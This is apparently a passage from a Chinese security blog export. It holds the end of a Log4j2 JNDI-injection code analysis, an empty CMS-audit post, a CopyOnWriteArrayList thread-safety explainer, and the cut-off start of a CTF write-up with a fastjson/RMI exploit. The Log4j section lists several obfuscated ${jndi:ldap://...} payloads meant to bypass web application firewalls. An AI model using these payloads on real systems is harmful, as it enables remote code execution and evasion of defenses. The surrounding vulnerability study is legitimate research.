PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:244, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:229, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:59, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:481, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:456, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:161, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">fatal:1053, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:10, test</span><br></pre></td></tr></table></figure>
<h3 id="MessagePatternConverter"><a href="#MessagePatternConverter" class="headerlink" title="MessagePatternConverter"></a>MessagePatternConverter</h3><p>从<br><code>format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</code><br>开始看起<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                        workingBuilder.setLength(offset);</span><br><span class="line">                        workingBuilder.append(config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><br>分析第二行可以知道，如果遇到<code>$&#123;</code>，就会进入判断语句，而这个workingBuilder和logger.fatal()的参数相关，换句话说，基本上workingBuilder就是logger.fatal()中的参数，只不过类型被转换了一下，原本是String，现在是StringBuilder类。<br>继续往下走，进入replace<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(source);</span><br><span class="line">    <span class="keyword">if</span> (!substitute(event, buf, <span class="number">0</span>, source.length())) &#123;</span><br><span class="line">        <span class="keyword">return</span> source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>来到了漏洞核心点substitue()</p>
<h3 id="substitue"><a href="#substitue" class="headerlink" title="substitue"></a>substitue</h3><p>接下来会逐段分析该函数中重要的代码段<br><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/1.jpg" alt><br>在这里会先进行判断，如果在代码中还存在<code>$&#123;</code>，就会进入递归，在里面进行再一次解析，这段先放放，继续往下看</p>
<p><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/2.jpg" alt><br>在这里valueDelimiterMatcher是<code>[:,-]</code><br>也就是说如果匹配到了:-就会进入循环语句，并进行一次切割处理<br>比如aaa:-bbb，<br>前面的aaa会被赋值给varName<br>后面的值bbb会被赋值给varDefaultValue<br>接着往下走<br><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/3.jpg" alt><br>先不详细介绍resolveVariable，只需要知道如果是类似前面<code>aaa:-bbb</code>这样的值没什么特殊意义的值，会直接返回null，那么就会把varDefaultValue赋值给varValue，也就是bbb，而下面的代码大意就是把buf用varValue进行了部分替换<br>如果payload原本是<br><code>$&#123;jndi:ldap://127.0.0.1/$&#123;abc:-exp&#125;loit&#125;</code><br>那么就会被替换成<br><code>$&#123;jndi:ldap://127.0.0.1/exploit&#125;</code></p>
<p>那么回到刚刚开始那个递归的地方<br><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/1.jpg" alt><br>varNameExpr就会被赋值为被替换过的payload接着解析</p>
<h3 id="resolveVariable"><a href="#resolveVariable" class="headerlink" title="resolveVariable"></a>resolveVariable</h3><p>接下来重点讲下resolveVariable，这里是触发jndi注入的关键<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf,</span></span><br><span class="line"><span class="params">                                    <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> getVariableResolver();</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resolver.lookup(event, variableName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里的resolver可以看相关文档<br><a href="https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html">https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html</a><br>进入这个lookup中<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, String <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">var</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">prefixPos</span> <span class="operator">=</span> <span class="keyword">var</span>.indexOf(PREFIX_SEPARATOR);</span><br><span class="line">    <span class="keyword">if</span> (prefixPos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(<span class="number">0</span>, prefixPos).toLowerCase(Locale.US);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">lookup</span> <span class="operator">=</span> strLookupMap.get(prefix);</span><br><span class="line">        <span class="keyword">if</span> (lookup <span class="keyword">instanceof</span> ConfigurationAware) &#123;</span><br><span class="line">            ((ConfigurationAware) lookup).setConfiguration(configuration);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (lookup != <span class="literal">null</span>) &#123;</span><br><span class="line">            value = event == <span class="literal">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> = <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (defaultLookup != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">return</span> <span class="variable">event</span> <span class="operator">=</span>= <span class="literal">null</span> ? defaultLookup.lookup(<span class="keyword">var</span>) : defaultLookup.lookup(event, <span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>因为会去分割<code>:</code>，那么会根据jndi取出jndi的strLookupMap，最后进行jndi调用</p>
<h2 id="绕waf"><a href="#绕waf" class="headerlink" title="绕waf"></a>绕waf</h2><p>他会根据传入的协议取出相对应的lookup，然后调用，那么就可以有如下的绕过手法<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;a:-j&#125;ndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;a:-j&#125;n$&#123;::-d&#125;i:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;lower:jn&#125;di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;$&#123;::-di&#125;:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="http://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.log4j2_rce%E5%88%86%E6%9E%90.html">http://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.log4j2_rce%E5%88%86%E6%9E%90.html</a></li>
<li><a href="https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html">https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html</a></li>
</ul>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>log4j</tag>
        <tag>jndi</tag>
      </tags>
  </entry>
  <entry>
    <title>基于mvc框架的cms分析(没时间写)</title>
    <url>/2023/02/28/%E5%9F%BA%E4%BA%8Emvc%E6%A1%86%E6%9E%B6%E7%9A%84cms%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<!-- ## MVC的简单理解
基本上网上很多资料是有关于MVC，和类似这张图的
![](1.png)
其实在php中，我审计过的一两个基于MVC框架的phpcms，基本上可以通俗的理解为
+ Model：与数据库相关
+ Controller： 与处理相应的请求有关，也就是会牵扯到路由
+ View：与html有关，就是最后渲染出来的结果

## 分析路由
拿到一个基于MVC框架的phpcms，首先就是要分析他的路由，也就是Controller，一般URL链接都是长这样
`index.php?c=Controller&a=Action&d=do`
+ c代表文件夹
+ a代表文件，
+ d代表文件中的函数 -->]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>php</tag>
        <tag>mvc</tag>
      </tags>
  </entry>
  <entry>
    <title>CopyOnWriteArrayList解析</title>
    <url>/2023/04/19/CopyOnWriteArrayList%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这两个月不知道干嘛，学工具又不想学，就开始研究tomcat的源码。<br><span id="more"></span><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//生命周期监听器保存在一个线程安全的CopyOnWriteArrayList中</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> List&lt;LifecycleListener&gt; lifecycleListeners = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addLifecycleListener</span><span class="params">(LifecycleListener listener)</span> &#123;</span><br><span class="line">    lifecycleListeners.add(listener);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> LifecycleListener[] findLifecycleListeners() &#123;</span><br><span class="line">    <span class="keyword">return</span> lifecycleListeners.toArray(<span class="keyword">new</span> <span class="title class_">LifecycleListener</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeLifecycleListener</span><span class="params">(LifecycleListener listener)</span> &#123;</span><br><span class="line">    lifecycleListeners.remove(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>好奇为什么CopyOnWriteArrayList可以实现线程安全，本篇就浅析一下为什么他可以实现线程安全</p>
<h2 id="普通ArrayList"><a href="#普通ArrayList" class="headerlink" title="普通ArrayList"></a>普通ArrayList</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IteratorTest</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		</span><br><span class="line">		list.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">		list.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">		list.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		Iterator&lt;String&gt; iter = list.iterator();</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//我当前正在迭代集合（这里模拟并发中读取某一list的场景）</span></span><br><span class="line">		<span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">			</span><br><span class="line">			System.err.println(iter.next());</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.err.println(Arrays.toString(list.toArray()));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的程序如果在单线程执行是没什么问题的，但是如果到了多线程，那么就会因为add（写操作）和next（读操作）同时进行，而引发异常<br>下面的代码就是会抛出异常的代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IteratorTest</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">		list.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">		list.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">		list.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">		Iterator&lt;String&gt; iter = list.iterator();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 存放10个线程的线程池</span></span><br><span class="line">		<span class="type">ExecutorService</span> <span class="variable">service</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 执行10个任务(我当前正在迭代集合（这里模拟并发中读取某一list的场景）)</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">			service.execute(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">				<span class="meta">@Override</span></span><br><span class="line">				<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">					<span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">						System.err.println(iter.next());</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 执行10个任务</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">			service.execute(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">				<span class="meta">@Override</span></span><br><span class="line">				<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">					list.add(<span class="string">&quot;121&quot;</span>);<span class="comment">// 添加数据</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.err.println(Arrays.toString(list.toArray()));</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="next"><a href="#next" class="headerlink" title="next"></a>next</h3><p>如下是ArrayList的next()代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">    checkForComodification();</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= size)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">    Object[] elementData = ArrayList.<span class="built_in">this</span>.elementData;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= elementData.length)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">    cursor = i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> (E) elementData[lastRet = i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在next()中<br><code>Object[] elementData = ArrayList.this.elementData;</code><br>触发了elementData的读取操作</p>
<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p>如下是ArrayList的add()代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    checkForComodification();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor;</span><br><span class="line">        ArrayList.<span class="built_in">this</span>.add(i, e);</span><br><span class="line">        cursor = i + <span class="number">1</span>;</span><br><span class="line">        lastRet = -<span class="number">1</span>;</span><br><span class="line">        expectedModCount = modCount;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">    rangeCheckForAdd(index);</span><br><span class="line"></span><br><span class="line">    ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">    System.arraycopy(elementData, index, elementData, index + <span class="number">1</span>,</span><br><span class="line">                        size - index);</span><br><span class="line">    elementData[index] = element;</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在add()中<br><code>ArrayList.this.add(i, e);</code><br>触发了elementData的写操作</p>
<h2 id="CopyOnWriteArrayList"><a href="#CopyOnWriteArrayList" class="headerlink" title="CopyOnWriteArrayList"></a>CopyOnWriteArrayList</h2><h3 id="add-1"><a href="#add-1" class="headerlink" title="add"></a>add</h3><p>那么看看CopyOnWriteArrayList是如何实现add的<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object[] elements = getArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> elements.length;</span><br><span class="line">        Object[] newElements = Arrays.copyOf(elements, len + <span class="number">1</span>);</span><br><span class="line">        newElements[len] = e;</span><br><span class="line">        setArray(newElements);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到add操作进行了加锁，并且生成了一个新的数组，把旧的列表复制到新列表中<br>在这触发了elements的读取写入操作</p>
<h2 id="next-1"><a href="#next-1" class="headerlink" title="next"></a>next</h2><p>再来看看如何进行next操作的<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">COWIterator</span>&lt;E&gt;(getArray(), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">COWIterator</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ListIterator</span>&lt;E&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">COWIterator</span><span class="params">(Object[] elements, <span class="type">int</span> initialCursor)</span> &#123;</span><br><span class="line">        cursor = initialCursor;</span><br><span class="line">        snapshot = elements;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (! hasNext())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">        <span class="keyword">return</span> (E) snapshot[cursor++];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到CopyOnWriteArrayList的next操作并没有像Arraylist中的next一样进行对elements的直接操作，而是用了一个副本，对副本进行操作<br>也就是说，当你使用了<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Iterator&lt;String&gt; iter = list.iterator();</span><br></pre></td></tr></table></figure><br>获取迭代对象，后面如果再使用add操作也只会输出原先的数组的值，下面是示例代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> CopyOnWriteArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        list.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Iterator&lt;String&gt; iter = list.iterator();</span><br><span class="line">        list.add(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">            System.err.println(iter.next());</span><br><span class="line">        &#125;</span><br><span class="line">        System.err.println(Arrays.toString(list.toArray()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">[1, 2, 3, 4]</span><br></pre></td></tr></table></figure><br>如果把CopyOnWriteArrayList改成ArrayList，那么就会因为next的第一行的函数checkForComodification()报错<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">checkForComodification</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>CopyOnWriteArrayList能解决多线程的问题主要有三点</p>
<ul>
<li>使用了赋值以后的elements去进行迭代，并不会去直接操作原先的elements</li>
<li>在进行了add操作的时候进行了加锁操作</li>
<li>加锁完以后，会对elements复制一个新的备份，然后在新的备份加完以后再覆盖旧的</li>
</ul>
<p>以上三点最重要的还是第一点，可以自己对普通的ArrayList的add操作进行加锁实验一下，依旧会报错</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://juejin.cn/post/6844903576339218440">https://juejin.cn/post/6844903576339218440</a></li>
</ul>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>aliyunctf web</title>
    <url>/2023/04/26/aliyunctf-web/</url>
    <content><![CDATA[<h2 id="ezBean"><a href="#ezBean" class="headerlink" title="ezBean"></a>ezBean</h2><span id="more"></span>
<p>这题本来做出来了，但是本地一直没复现成功（不知道是不是fastjson1.2.60版本的原因）也没想着直接去打poc，就错失了300分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span></span><br><span class="line">            Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>));</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>));</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1099/el&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;URL: &quot;</span> + u + <span class="string">&quot;, connecting&quot;</span>);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>((JMXServiceURL)u, <span 